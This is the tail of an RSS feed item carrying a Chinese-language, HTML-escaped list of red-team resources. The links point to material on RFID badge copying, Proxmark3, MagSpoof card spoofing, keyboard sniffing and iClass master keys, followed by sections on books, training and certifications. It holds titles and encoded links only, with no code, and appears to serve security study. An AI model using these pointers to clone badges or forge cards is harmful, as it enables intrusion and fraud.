&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudHJ1c3R3YXZlLmNvbS9SZXNvdXJjZXMvU3BpZGVyTGFicy1CbG9nL0dldHRpbmctaW4td2l0aC10aGUtUHJveG1hcmstMy1hbmQtUHJveEJydXRlLw==&#34;&gt;从 Proxmark3 与 ProxBrute 开始&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLm52aXNvLmJlLzIwMTcvMDEvMTEvYS1wcmFjdGljYWwtZ3VpZGUtdG8tcmZpZC1iYWRnZS1jb3B5aW5nLw==&#34;&gt;RFID Badge 复制实用指南&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudHVubmVsc3VwLmNvbS9jb250ZW50cy1vZi1hLXBoeXNpY2FsLXBlbi10ZXN0ZXJzLWJhY2twYWNrLw==&#34;&gt;一个物理渗透测试人员的背包&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NhbXlrL21hZ3Nwb29m&#34;&gt;MagSpoof - 信用卡 / 磁条卡伪造&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zYW15LnBsL2tleXN3ZWVwZXIv&#34;&gt;无线键盘嗅探器&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmtjaHVuZy5jby9yZmlkLWhhY2tpbmctd2l0aC10aGUtcHJveG1hcmstMy8=&#34;&gt;使用 Proxmark 3 进行 RFID 入侵&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY3MuYmhhbS5hYy51ay9+Z2FyY2lhZi9wdWJsaWNhdGlvbnMvVHV0b3JpYWxfUHJveG1hcmtfdGhlX1N3aXNzX0FybXlfS25pZmVfZm9yX1JGSURfU2VjdXJpdHlfUmVzZWFyY2gtUkZJRFNlYzEyLnBkZg==&#34;&gt;RFID 的瑞士军刀&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vYmgtdXMtMTIvQnJpZWZpbmdzL0NfTWlsbGVyL0JIX1VTXzEyX01pbGxlcl9ORkNfYXR0YWNrX3N1cmZhY2VfV1AucGRm&#34;&gt;探索 NFC 的攻击面&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dlcmhhcmQuZGVrb25pbmdnYW5zLm5sL2RvY3VtZW50cy9wdWJsaWNhdGlvbnMvZGVrb25pbmdnYW5zLnBoZC50aGVzaXMucGRm&#34;&gt;智能卡&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmtjaHVuZy5jby9yZXZlcnNlLWVuZ2luZWVyaW5nLWhpZC1pY2xhc3MtbWFzdGVyLWtleXMv&#34;&gt;逆向 HID iClass 的主密钥&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucHduaWVleHByZXNzLmNvbS9hb3Bw&#34;&gt;Android Open Pwn Project (AOPP)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-8&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 杂项&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL1JlZFRpcHM=&#34;&gt;Vysec 的红队技巧&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8wMi8yMy9jb2JhbHQtc3RyaWtlLXRpcHMtZm9yLTIwMTYtY2NkYy1yZWQtdGVhbXMv&#34;&gt;Cobalt Strike 红队技巧 - 2016&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNy8wOS9tb2RlbHMtZm9yLXJlZC10ZWFtLW9wZXJhdGlvbnMv&#34;&gt;红队行动模型&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21hZ29vL3JlZHRlYW0tcGxhbg==&#34;&gt;红队实践计划&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vY2xiYnF2YXdRZw==&#34;&gt;Raphael Mudge - 肮脏的红队技巧&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-9&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 电子书籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9OZXh0LUdlbmVyYXRpb24tVGVhbWluZy1IZW5yeS1EYWx6aWVsL2RwLzAxMjgwNDE3MTQ=&#34;&gt;下一代红队行动&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9UYXJnZXRlZC1DeWJlci1BdHRhY2tzLU11bHRpLXN0YWdlZC1FeHBsb2l0cy9kcC8wMTI4MDA2MDQ4&#34;&gt;针对性网络攻击&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9BZHZhbmNlZC1QZW5ldHJhdGlvbi1UZXN0aW5nLUhhY2tpbmctTmV0d29ya3MvZHAvMTExOTM2NzY4OQ==&#34;&gt;高级渗透测试：入侵全球最安全的网络&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9Tb2NpYWwtRW5naW5lZXJzLVBsYXlib29rLVByYWN0aWNhbC1QcmV0ZXh0aW5nL2RwLzA2OTIzMDY2MTcvcmVmPWFzX2xpX3NzX3RsP2llPVVURjgmYW1wO2xpbmtDb2RlPXNsMSZhbXA7dGFnPXRhbGFtYW50ZXN1cy0yMCZhbXA7bGlua0lkPTM3YjYzYzc3MDJjOWJlNmI5ZjZhMWI5MjFjODhjOGNk&#34;&gt;社会工程的手边书&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-10&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 培训（免费）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1JUnBTN29aM3owbyZhbXA7bGlzdD1QTDlITzZNX01VMm5lc3hTbWhKakV2d0xoVW9IUEhtWHZ6&#34;&gt;Tradecraft - 关于红队行动的课程&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wOS8zMC9hZHZhbmNlZC10aHJlYXQtdGFjdGljcy1jb3Vyc2UtYW5kLW5vdGVzLw==&#34;&gt;高级威胁战术课程与笔记&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-11&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-11&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 认证&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jcmVzdC1hcHByb3ZlZC5vcmcvZXhhbWluYXRpb24vY2VydGlmaWVkLXNpbXVsYXRlZC1hdHRhY2stc3BlY2lhbGlzdC8=&#34;&gt;CREST 模拟攻击专家&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jcmVzdC1hcHByb3ZlZC5vcmcvZXhhbWluYXRpb24vY2VydGlmaWVkLXNpbXVsYXRlZC1hdHRhY2stbWFuYWdlci8=&#34;&gt;CREST 模拟攻击管理员&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2Fucy5vcmcvY291cnNlL3JlZC10ZWFtLW9wZXJhdGlvbnMtYW5kLXRocmVhdC1lbXVsYXRpb24=&#34;&gt;SEC564: 红队行动与威胁仿真&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
    </channel>
</rss>
